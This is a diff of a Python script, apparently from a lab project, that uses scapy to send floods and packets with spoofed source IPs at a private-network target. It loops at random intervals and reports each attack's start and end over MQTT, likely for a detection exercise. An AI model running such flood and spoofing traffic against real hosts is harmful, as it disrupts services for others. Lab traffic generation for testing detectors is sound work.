@@ -6,17 +6,27 @@ from scapy.all import IP, TCP, send, ICMP, UDP
 import uuid
 
 
-def on_connect(client, userdata, flags, rc):
-    print("Connected with result code "+str(rc))
+def on_connect(client, userdata, flags, rc, properties=None):
+    if rc == 0:
+        print("Connected with result code "+str(rc))
+    else:
+        print("Failed to connect, return code "+str(rc))
+
+def on_disconnect(client, userdata, flags, rc):
+    print("Disconnected from MQTT broker.")
 
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.on_connect = on_connect
-client.connect("192.168.3.109", 1883, 60)
+client.connect("192.168.1.18", 1883, 60)
+client.on_disconnect = on_disconnect
+
+client.loop_start()  # Démarrer une boucle séparée pour la gestion de la connexion
 
 def send_attack_notification(attack_type, attack_id, is_start=True):
     message = f"{attack_type}:{attack_id}{':start' if is_start else ':end'}"
-    client.publish("attack/type", message)
-    print(f"Sent notification for {message}")
+    result = client.publish("attack/type", message)
+    if result.rc != mqtt.MQTT_ERR_SUCCESS:
+        print(f"Failed to send notification for {message}")
 
 def simulate_attack(target_ip):
     attack_type = random.choice(['ddos', 'ping_flood', 'mitm', 'udp_flood'])
@@ -42,8 +52,8 @@ def simulate_attack(target_ip):
 
     elif attack_type == "mitm":
         random_number = random.randint(1, 253)
-        victim_ip = f"192.168.3.(met l'ip du client ACTUEL)"
-        nombre_paquets = random.randint(200, 1000)
+        victim_ip = f"192.168.1.18"
+        nombre_paquets = random.randint(500, 1500)
         for _ in range(nombre_paquets):
             spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
             # Falsification des adresses IP pour imiter l'IP de la victime
@@ -65,12 +75,13 @@ def simulate_attack(target_ip):
     send_attack_notification(attack_type, attack_id, is_start=False)
 
 if __name__ == "__main__":
-    target_ip = "192.168.3.109"
+    target_ip = "192.168.1.18"
     try:
         while True:
             simulate_attack(target_ip)
-            sleep_time = random.randint(45, 120)
+            sleep_time = random.randint(10, 100)
             print(f"Waiting {sleep_time} seconds before next attack")
             sleep(sleep_time)
     except KeyboardInterrupt:
         print("Simulation stopped by user.")
+        client.loop_stop()
